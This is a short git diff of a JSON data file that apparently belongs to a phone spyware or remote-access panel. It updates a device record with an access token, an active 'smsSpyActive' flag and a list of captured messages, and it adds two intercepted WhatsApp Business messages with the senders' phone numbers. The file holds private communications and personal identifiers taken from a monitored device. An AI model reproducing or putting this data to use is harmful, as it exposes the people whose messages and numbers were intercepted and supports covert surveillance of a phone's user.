@@ -2845,7 +2845,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "d74578f3ff66c3430ca09d01f1212737",
-    "lastSeen": 1776707922875,
+    "lastSeen": 1776707928981,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T17:55:24.269Z",
@@ -2861,6 +2861,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 812-4458-6106",
+        "content": "Cara nge lock device gmn",
+        "time": "21/04 00:58",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776707928987
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 831-6863-7098",
+        "content": "Sabar deh kalo dia bikin sw",
+        "time": "21/04 00:58",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776707928871
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
